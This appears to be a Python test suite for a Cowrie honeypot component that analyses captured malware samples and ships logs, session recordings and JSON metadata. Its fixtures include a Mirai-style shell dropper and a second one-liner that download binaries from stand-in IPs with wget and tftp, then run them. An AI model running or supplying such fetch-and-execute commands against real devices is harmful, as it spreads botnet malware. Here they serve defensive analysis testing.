import gzip
import hashlib
import importlib.util
import json
import os
import struct
import tempfile
import time
import unittest
from pathlib import Path
from unittest import mock

ROOT = Path(__file__).resolve().parent.parent
FIXTURE = Path(__file__).parent / "fixtures" / "cowrie-3.1.json"


def load_shipper(env):
    with mock.patch.dict(os.environ, env):
        spec = importlib.util.spec_from_file_location("shipper", ROOT / "sensor" / "shipper.py")
        module = importlib.util.module_from_spec(spec)
        spec.loader.exec_module(module)
    return module


def make_elf(bits, endian, machine, e_type=2, interp=None, symtab=False, sections=True):
    """A minimal but well-formed ELF image: header, program headers, optional interp, section headers."""
    e = "<" if endian == "little" else ">"
    ehsize, phentsize, shentsize = (52, 32, 40) if bits == 32 else (64, 56, 64)
    phdrs = [(1, 0, 0)]                                   # PT_LOAD
    interp_bytes = interp.encode() + b"\x00" if interp else b""
    if interp:
        phdrs.append((3, None, len(interp_bytes)))       # PT_INTERP, offset filled in below
    phoff = ehsize
    interp_off = phoff + phentsize * len(phdrs)
    shoff = interp_off + len(interp_bytes)
    types = [0, 1] + ([2] if symtab else [])             # NULL, PROGBITS, SYMTAB
    shnum = len(types) if sections else 0

    ph = b""
    for p_type, offset, size in phdrs:
        offset = interp_off if offset is None else offset
        if bits == 32:
            ph += struct.pack(e + "IIIIIIII", p_type, offset, 0, 0, size, size, 5, 4)
        else:
            ph += struct.pack(e + "IIQQQQQQ", p_type, 5, offset, 0, 0, size, size, 8)
    sh = b""
    for sh_type in types[:shnum]:
        if bits == 32:
            sh += struct.pack(e + "IIIIIIIIII", 0, sh_type, 0, 0, 0, 0, 0, 0, 0, 0)
        else:
            sh += struct.pack(e + "IIQQQQIIQQ", 0, sh_type, 0, 0, 0, 0, 0, 0, 0, 0)
    ident = b"\x7fELF" + bytes([1 if bits == 32 else 2, 1 if endian == "little" else 2, 1, 0]) + bytes(8)
    fmt = e + ("HHIIIIIHHHHHH" if bits == 32 else "HHIQQQIHHHHHH")
    header = ident + struct.pack(fmt, e_type, machine, 1, 0x8000, phoff, shoff if shnum else 0, 0,
                                 ehsize, phentsize, len(phdrs), shentsize, shnum, 0)
    return header + ph + interp_bytes + sh


DROPPER = (
    "#!/bin/sh\n"
    "cd /tmp || cd /var/run; wget http://203.0.113.5/bins/arm7 -O kla.arm7; chmod 777 kla.arm7; ./kla.arm7\n"
    "wget http://203.0.113.5/bins/mipsel; tftp -g -r x86_64 203.0.113.5; /bin/busybox MIRAI\n"
)


class AnalyzerTest(unittest.TestCase):
    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory()
        self.dir = Path(self.tmp.name)
        self.shipper = load_shipper({"COWRIE_VAR": str(self.dir)})

    def tearDown(self):
        self.tmp.cleanup()

    def analyze(self, data):
        path = self.dir / hashlib.sha256(data).hexdigest()
        path.write_bytes(data)
        return self.shipper.analyze(path)

    def test_arm_static_stripped(self):
        data = make_elf(32, "little", 40)
        meta = self.analyze(data)
        self.assertEqual((meta["kind"], meta["sha256"], meta["size"]), ("elf", hashlib.sha256(data).hexdigest(), len(data)))
        self.assertEqual(meta["magic"], data[:16].hex())
        self.assertEqual(meta["elf"], {"bits": 32, "endian": "little", "machine": "ARM", "machine_id": 40,
                                       "type": "EXEC", "static": True, "stripped": True, "interp": None})
        self.assertIsNone(meta["packer"])
        self.assertIsNone(meta["script"])
        self.assertIsNone(meta["intel"])
        self.assertRegex(meta["first_seen"], r"^\d{4}-\d\d-\d\dT\d\d:\d\d:\d\dZ$")

    def test_x86_64_dynamic_with_symbols(self):
        meta = self.analyze(make_elf(64, "little", 62, e_type=3, interp="/lib64/ld-linux-x86-64.so.2", symtab=True))
        elf = meta["elf"]
        self.assertEqual((elf["machine"], elf["bits"], elf["type"]), ("x86-64", 64, "DYN"))
        self.assertEqual((elf["static"], elf["stripped"], elf["interp"]), (False, False, "/lib64/ld-linux-x86-64.so.2"))

    def test_mips_big_endian_without_sections(self):
        elf = self.analyze(make_elf(32, "big", 8, sections=False))["elf"]
        self.assertEqual((elf["machine"], elf["endian"], elf["static"], elf["stripped"]), ("MIPS", "big", True, None))

    def test_unknown_machine_and_damaged_headers(self):
        self.assertEqual(self.analyze(make_elf(32, "little", 999))["elf"]["machine"], "machine 999")
        truncated = self.analyze(b"\x7fELF\x01\x01\x01" + bytes(13))
        self.assertEqual((truncated["kind"], truncated["elf"]["bits"], truncated["elf"]["machine"]), ("elf", 32, None))
        self.assertIsNone(self.analyze(b"\x7fELF\x09\x09" + bytes(60))["elf"])
        # Program/section header offsets pointing far past the end of the file.
        bogus = bytearray(make_elf(32, "little", 40))
        struct.pack_into("<I", bogus, 28, 0xFFFFFF00)
        struct.pack_into("<I", bogus, 32, 0xFFFFFF00)
        elf = self.analyze(bytes(bogus))["elf"]
        self.assertEqual((elf["static"], elf["stripped"]), (True, None))

    def test_mozilla_user_agent_is_not_mozi(self):
        ua = b"Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
        self.assertEqual(self.analyze(make_elf(32, "little", 40) + ua)["hints"], [])
        self.assertEqual(self.analyze(make_elf(32, "little", 40) + b"/tmp/Mozi.m")["hints"], ["mozi"])

    def test_upx_marker(self):
        meta = self.analyze(make_elf(32, "little", 40) + b"\x00" * 64 + b"UPX!" + b"\x00" * 16)
        self.assertEqual(meta["packer"], "UPX")

    def test_shell_dropper(self):
        meta = self.analyze(DROPPER.encode())
        self.assertEqual(meta["kind"], "script")
        script = meta["script"]
        self.assertEqual((script["shebang"], script["lines"]), ("#!/bin/sh", 3))
        self.assertEqual(script["urls"], ["http://203.0.113.5/bins/arm7", "http://203.0.113.5/bins/mipsel"])
        self.assertEqual(script["archs"], ["arm7", "mipsel", "x86_64"])
        self.assertEqual(meta["hints"], ["busybox", "mirai"])
        no_shebang = self.analyze(b"cd /tmp; wget http://198.51.100.7/x86 ; sh x86\n")
        self.assertEqual((no_shebang["kind"], no_shebang["script"]["shebang"]), ("script", None))
        self.assertEqual(no_shebang["script"]["archs"], ["x86"])

    def test_other_kinds(self):
        empty = self.analyze(b"")
        self.assertEqual((empty["kind"], empty["magic"], empty["elf"], empty["script"]), ("empty", "", None, None))
        self.assertEqual(self.analyze(b"\x1f\x8b\x08\x00" + bytes(40))["kind"], "archive")
        self.assertEqual(self.analyze(b"<!DOCTYPE html><html><body>hi</body></html>")["kind"], "html")
        self.assertEqual(self.analyze(bytes(range(256)) * 4)["kind"], "data")
        self.assertEqual(self.analyze("ahoj světe, žluťoučký kůň\n".encode())["kind"], "text")
        unicode_script = self.analyze("#!/bin/sh\necho 'příliš'\nwget http://192.0.2.1/a.sh\n".encode())
        self.assertEqual(unicode_script["kind"], "script")


class ShippingTest(unittest.TestCase):
    OLD = time.time() - 3600

    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory()
        root = Path(self.tmp.name)
        self.var = root / "var"
        self.blobs = root / "blobs"
        self.state_dir = root / "state"
        logs = self.var / "log" / "cowrie"
        logs.mkdir(parents=True)
        (logs / "cowrie.json").write_text(FIXTURE.read_text())
        self.tty = self.var / "lib" / "cowrie" / "tty"
        self.downloads = self.var / "lib" / "cowrie" / "downloads"
        self.tty.mkdir(parents=True)
        self.downloads.mkdir(parents=True)
        self.recording = self.write(self.tty, b"\x01\x00\x00\x00" + bytes(20) + b"recording")
        self.recent = self.write(self.tty, b"still settling", old=False)
        self.in_progress = self.tty / "20261014-202344-ab84a27c2e7a-0e.log"
        self.in_progress.write_bytes(b"open session")
        os.utime(self.in_progress, (self.OLD, self.OLD))
        self.elf = self.write(self.downloads, make_elf(32, "little", 40))
        self.empty = self.write(self.downloads, b"")
        self.shipper = load_shipper({"COWRIE_VAR": str(self.var), "STATE_DIRECTORY": str(self.state_dir),
                                     "SHIPPER_DRY_RUN_DIR": str(self.blobs)})

    def tearDown(self):
        self.tmp.cleanup()

    def write(self, directory, data, old=True):
        path = directory / hashlib.sha256(data).hexdigest()
        path.write_bytes(data)
        if old:
            os.utime(path, (self.OLD, self.OLD))
        return path

    def run_main(self):
        with mock.patch("builtins.print") as printed:
            code = self.shipper.main()
        return code, [str(c.args[0]) for c in printed.call_args_list]

    def state(self):
        return json.loads((self.state_dir / "state.json").read_text())

    def test_ships_each_artifact_once(self):
        with mock.patch.object(self.shipper, "put_blob", wraps=self.shipper.put_blob) as put:
            code, _ = self.run_main()
        self.assertEqual(code, 0)
        types = {call.args[0].split("/")[0]: call.args[3] for call in put.call_args_list}
        self.assertEqual(types, {"cowrie": "application/gzip", "tty": "application/octet-stream",
                                 "malware": "application/json"})
        self.assertEqual(gzip.decompress((self.blobs / "cowrie" / f"{self.today()}.json.gz").read_bytes()).decode(),
                         FIXTURE.read_text())
        self.assertEqual(sorted(p.name for p in (self.blobs / "tty").iterdir()), [self.recording.name])
        self.assertEqual((self.blobs / "tty" / self.recording.name).read_bytes(), self.recording.read_bytes())
        samples = {p.name: json.loads(p.read_text()) for p in (self.blobs / "malware").iterdir()}
        self.assertEqual(set(samples), {f"{self.elf.name}.json", f"{self.empty.name}.json"})
        self.assertEqual(samples[f"{self.elf.name}.json"]["elf"]["machine"], "ARM")
        self.assertFalse(any(p.suffix != ".json" for p in (self.blobs / "malware").iterdir()))   # never the binary
        self.assertEqual(self.state()["tty"], [self.recording.name])
        self.assertEqual(self.state()["malware"], sorted([self.elf.name, self.empty.name]))

        code, printed = self.run_main()
        self.assertEqual(code, 0)
        self.assertFalse([line for line in printed if "uploaded" in line])

        os.utime(self.recent, (self.OLD, self.OLD))     # settled now
        _, printed = self.run_main()
        self.assertEqual(len([line for line in printed if "uploaded recording" in line]), 1)
        self.assertTrue((self.blobs / "tty" / self.recent.name).exists())
        self.assertFalse((self.blobs / "tty" / self.in_progress.name).exists())

    def test_state_forgets_deleted_artifacts(self):
        self.run_main()
        self.recording.unlink()
        self.empty.unlink()
        self.run_main()
        self.assertEqual(self.state()["tty"], [])
        self.assertEqual(self.state()["malware"], [self.elf.name])

    def test_failing_analysis_does_not_block_logs_or_recordings(self):
        with mock.patch.object(self.shipper, "analyze", side_effect=ValueError("bad sample")):
            code, printed = self.run_main()
        self.assertEqual(code, 1)
        self.assertTrue((self.blobs / "cowrie" / f"{self.today()}.json.gz").exists())
        self.assertTrue((self.blobs / "tty" / self.recording.name).exists())
        self.assertFalse((self.blobs / "malware").exists())
        self.assertTrue(any("bad sample" in line for line in printed))
        self.assertNotIn("malware", self.state())
        code, _ = self.run_main()                       # retried on the next run
        self.assertEqual(code, 0)
        self.assertEqual(len(list((self.blobs / "malware").iterdir())), 2)

    def test_failing_log_upload_does_not_block_artifacts(self):
        real_put = self.shipper.put_blob

        def put(name, *args):
            if name.startswith("cowrie/"):
                raise RuntimeError("upload of logs failed: HTTP 403")
            return real_put(name, *args)

        with mock.patch.object(self.shipper, "put_blob", side_effect=put):
            code, printed = self.run_main()
        self.assertEqual(code, 1)
        self.assertTrue(any("ship_logs failed" in line for line in printed))
        self.assertTrue((self.blobs / "tty" / self.recording.name).exists())
        self.assertEqual(len(list((self.blobs / "malware").iterdir())), 2)
        self.assertNotIn("cowrie.json", self.state())

    def today(self):
        import datetime as dt
        mtime = (self.var / "log" / "cowrie" / "cowrie.json").stat().st_mtime
        return dt.datetime.fromtimestamp(mtime, dt.timezone.utc).date().isoformat()


if __name__ == "__main__":
    unittest.main()
